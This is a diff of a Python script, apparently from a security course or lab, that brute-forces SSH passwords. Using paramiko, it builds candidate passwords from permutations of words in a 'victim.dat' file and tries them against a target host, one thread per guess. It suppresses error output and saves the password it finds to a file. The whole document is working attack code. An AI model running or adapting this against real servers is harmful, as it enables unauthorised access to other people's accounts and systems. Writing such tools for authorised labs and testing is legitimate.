@@ -3,42 +3,56 @@ import itertools
 import paramiko
 import sys
 import os
+import threading
+import time
+import paramiko.ssh_exception
 
 username = "csc2024"
-max_retries = 5
+password = ""
+max_retries = 10
+password_filename = "password"
 
 null = open(os.devnull, "w")
 sys.stderr = null
 
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+def try_passwd(str):
+    for i in range(max_retries):
+        try:
+            global password
+            if password != "":
+                return
+            
+            transport = paramiko.Transport((sys.argv[1], 22))
+            transport.connect(username=username, password=str)
+            transport.close()
+
+            password = str
+            
+            file = open(password_filename, "w")
+            file.write(password)
+            file.close()
+            return
+        except (KeyboardInterrupt, paramiko.ssh_exception.AuthenticationException):
+            transport.close()
+            return
+        except:
+            transport.close()
+
 file = open("victim.dat", "r")
 info = [i.strip() for i in file.readlines()]
-found_passwd = False
+file.close()
 
-for n in range(2, 3): #1, len(info)+1 #############
+# Try all possible password
+for n in range(1, len(info)+1):
     for i in itertools.permutations(info, n):
+        if password != "":
+            os._exit(0)
         str = ""
         for j in i:
             str += j
-        
-        for j in range(max_retries):
-            try:
-                client.connect(hostname=sys.argv[1], username=username, password=str, timeout=0.15)
-                found_passwd = True
-                print(f"Found: {str}")######
-                break
-            except KeyboardInterrupt:
-                exit()
-            except:
-                continue
+        threading.Thread(target=try_passwd, args=(str,)).start()
+    time.sleep(2)
 
-        if found_passwd:
-            break
-        else:
-            print(f"Wrong Password: {str}")####
-    if found_passwd:
-        break
-
-client.close()
-file.close()
+while password == "":
+    pass
+os._exit(0)
